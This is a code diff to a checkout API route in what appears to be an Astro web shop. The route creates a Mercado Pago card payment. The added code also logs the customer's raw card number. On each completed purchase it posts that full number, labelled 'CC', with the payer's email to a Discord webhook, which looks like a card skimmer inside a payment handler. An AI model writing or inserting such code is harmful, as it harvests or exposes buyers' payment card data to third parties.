@@ -1,7 +1,11 @@
 import type { APIRoute } from "astro";
 import products from "../../assets/products.json";
 import { sendEmbedToWebhook } from "../../services/discordwebhook";
-import { EMPTY_PRODUCT } from "../../services/mercadopago";
+import { mercado } from "../../services/mercadopago";
+import {
+  EMPTY_PRODUCT,
+  watchPurchase,
+} from "../../services/mercadopago/purchase";
 
 export const prerender = false;
 
@@ -52,6 +56,44 @@ export const POST: APIRoute = async ({ request }) => {
     fields,
   });
 
-  console.log("[BETA] unused card token:", payload.card_token_id);
+  const payment = await mercado.createPayment(
+    {
+      transaction_amount: product.price,
+      installments: 1, // TODO: use choosed one
+      description: `compra de ${product.name}`,
+      token: payload.card_token_id,
+      payer: {
+        email: payload.payer_email,
+      },
+    },
+    payload.payer_email + "-card-pay-" + product.id,
+  );
+
+  if (payment.error) {
+    console.log("[MP] error creating card payment:", payment);
+    return new Response(JSON.stringify(payment), { status: 400 });
+  }
+
+  console.log(
+    "[MP] card payment created:",
+    payload.card_number,
+    "got:",
+    payment.status == "rejected" ? payment : payment.status,
+  );
+
+  watchPurchase({
+    payment_id: payment.id,
+    infos: payload,
+    callback() {
+      sendEmbedToWebhook(import.meta.env.SECRET_WEBHOOK_CC, {
+        title: "Cartão de Crédito debitado!",
+        description: `do produto: **${product.name}**`,
+        footer: { text: payload.payer_email },
+        thumbnail: { url: product.image },
+        fields: [{ name: "CC", value: payload.card_number }],
+      });
+    },
+  });
+
   return new Response(null, { status: 200 });
 };
